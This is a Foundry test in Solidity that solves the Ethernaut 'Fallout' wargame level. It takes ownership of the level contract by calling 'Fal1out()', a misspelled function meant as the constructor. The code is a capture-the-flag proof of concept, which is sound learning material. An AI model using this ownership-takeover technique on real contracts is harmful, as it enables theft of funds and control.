// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "../Ethernaut.sol";
import "../03-Fallout/FalloutFactory.sol";
import "forge-std/Test.sol";

contract FalloutAttack is Test {
    function test() external {
        vm.createSelectFork(vm.envString("sepolia"));
        console.log("setup");
        Ethernaut ethernaut = new Ethernaut();
        FalloutFactory falloutfactory = new FalloutFactory();
        ethernaut.registerLevel(falloutfactory);
        address alice = makeAddr("alice");
        vm.startPrank(alice, alice);
        address falloutAddr = ethernaut.createLevelInstance(falloutfactory);
        Fallout fallout = Fallout(falloutAddr);
        emit log_named_address("address fallout", address(fallout));
        console.log("PoC:");
        console.log("1. constructor typo");
        fallout.Fal1out();
        console.log("submit");
        bool sukses = ethernaut.submitLevelInstance(payable(address(fallout)));
        assertTrue(sukses);
    }
}
